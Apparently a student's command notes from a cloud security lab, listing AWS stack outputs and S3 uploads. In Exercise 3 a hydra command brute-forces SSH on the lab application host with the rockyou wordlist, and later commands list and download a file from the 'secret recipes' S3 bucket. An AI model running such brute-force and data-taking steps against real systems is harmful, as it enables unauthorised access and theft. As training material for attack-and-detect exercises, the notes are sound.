# Exercise 1

## Outputs

BucketArnVPCFlowLogs	arn:aws:s3:::cand-c3-vpc-flow-logs-787614237147
BucketNameRecipesFree	cand-c3-free-recipes-787614237147
BucketNameRecipesSecret	cand-c3-secret-recipes-787614237147

ApplicationInstanceIP	ec2-3-224-223-36.compute-1.amazonaws.com
ApplicationURL	c1-web-service-alb-143963776.us-east-1.elb.amazonaws.com
AttackInstanceIP	ec2-52-202-180-62.compute-1.amazonaws.com

## Upload data

aws s3 cp free_recipe.txt s3://cand-c3-free-recipes-787614237147/ --region us-east-1

aws s3 cp secret_recipe.txt s3://cand-c3-secret-recipes-787614237147/ --region us-east-1

## Test app

http://c1-web-service-alb-143963776.us-east-1.elb.amazonaws.com/free_recipe


# Exercise 3

## Connect to attack instance

ssh -i ../recipe-vault-key.pem ubuntu@ec2-52-202-180-62.compute-1.amazonaws.com
ssh -i ../recipe-vault-key.pem ubuntu@ec2-3-85-137-57.compute-1.amazonaws.com

## Run the attack

hydra -l ubuntu -P rockyou.txt ssh://ec2-3-224-223-36.compute-1.amazonaws.com

## Task 2
### view the files in the secret recipes bucket
aws s3 ls  s3://cand-c3-secret-recipes-787614237147/ --region us-east-1
### download the files
aws s3 cp s3://cand-c3-secret-recipes-787614237147/secret_recipe.txt  .  --region us-east-1
### view contents of the file
cat secret_recipe.txt